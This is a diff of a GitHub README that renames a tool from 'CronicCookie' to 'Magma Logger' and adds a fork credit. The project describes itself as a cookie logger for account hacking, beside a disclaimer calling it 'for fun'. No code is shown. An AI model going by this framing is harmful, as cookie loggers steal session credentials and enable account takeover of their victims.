@@ -3,7 +3,7 @@
 -->
 
 # DISCLAIMER
-This is not to be used for any malicuis intent, I made this purely for fun (Made By Ibrahim B.)
+This is not to be used for any malicuis intent, I made this purely for fun (Made By Ibrahim B. Main database forked.)
 
 
 
@@ -14,7 +14,7 @@ This is not to be used for any malicuis intent, I made this purely for fun (Made
    <img src="https://github.com/DaEpicSwag/funni/blob/main/D7C73976-6EF8-4205-A31D-899FC0E92229.gif" alt="Logo" width="200" height="200">
   </a>
 
-  <h3 align="center">CronicCookie</h3>
+  <h3 align="center">Magma Logger/h3>
 
   <p align="center">
     Smooth and quick cookie logger for account hacking.
